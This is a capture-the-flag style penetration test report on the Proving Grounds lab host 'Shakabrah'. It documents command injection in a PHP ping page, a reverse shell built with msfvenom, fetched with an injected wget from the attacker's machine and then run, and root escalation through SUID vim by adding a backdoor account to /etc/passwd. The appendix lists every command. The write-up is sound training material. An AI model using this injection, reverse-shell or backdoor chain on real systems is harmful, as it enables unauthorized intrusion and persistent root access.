# Penetration Test Report for Proving Grounds - Shakabrah
- **Author:** Joey Melo
- **Date:** March 24, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.88.86 (Shakabrah)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the Shakabrah network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the Shakabrah network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the Shakabrah network. When performing the attacks, the tester was able to gain access to the machine, primarily due to a misconfigured php file in the HTTP host which allows remote code execution. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
- **TCP:** 22, 80
## Initial Access
### Vulnerability Explanation
The remote host is running a vulnerable php file in HTTP server. The php file does not sanitize user input, and a remote, unauthenticated attacker can exploit this vulnerability to obtain remote code execution in the host.
### Vulnerability Fix
Sanitize user input.
### Attack Walkthrough
During the enumeration phase, the tester identified an application running in the HTTP server executing the "ping" command.

![Connection tester on HTTP server](https://imgur.com/gUtTULu.png)

The tester attempted to bypass the "ping" command to obtain remote code execution and was able to leak the source code of the page. Upon inspection of the source code, the tester verified that the application had no input sanitization.

![Source code leaked](https://imgur.com/4tK9Vbs.png)

This vulnerability was exploited to obtain a stable remote shell in the system.
As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/PAgFq3Z.png)

## Privilege Escalation
### Vulnerability Explanation
The remote host is running the "vim.basic" binary with the SUID bit set. An attacker can exploit this to read and/or write files in the system with elevated privileges.
### Vulnerability Fix
Disable the SUID bit in the "vim.basic" binary.
### Attack Walkthrough
After establishing a foothold on the target, the tester noticed the "vim.basic" binary running with "setuid" privileges.

![Enumerating SUID files](https://imgur.com/Dt16vHh.png)

The tester abused this configuration to insert a new user in the system with root privileges.
```bash
/usr/bin/vim.basic /etc/passwd
## Insert this line in the /etc/passwd
hacker:$1$uHZwZwph$rikHzUCidpo0hVGhTCtKx0:0:0:root:/root:/bin/bash
```

![Inserting hacker user](https://imgur.com/5T8tKtu.png)

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/d0W5rEU.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.88.86

# HTTP Exploit
## In the HTTP page
; ls
; cat index.php
## In Kali
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f elf -o revshell.elf
python3 -m http.server 8000
nc -lvnp 80 # Only works listening on port 80
## In the HTTP page
; wget http://192.168.49.88/revshell.elf -O /tmp/revshell; chmod +x /tmp/revshell; /tmp/revshell

# Initial Access
cd /home/dylan
cat local.txt
ifconfig

# Privilege Escalation
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt
/usr/bin/vim.basic /etc/passwd
## In kali
openssl passwd -1
## Insert this line in the /etc/passwd
hacker:$1$uHZwZwph$rikHzUCidpo0hVGhTCtKx0:0:0:root:/root:/bin/bash
## In Shakabrah
su hacker # password="password"

# Post-Exploitation
cd /root
cat proof.txt
ifconfig
```
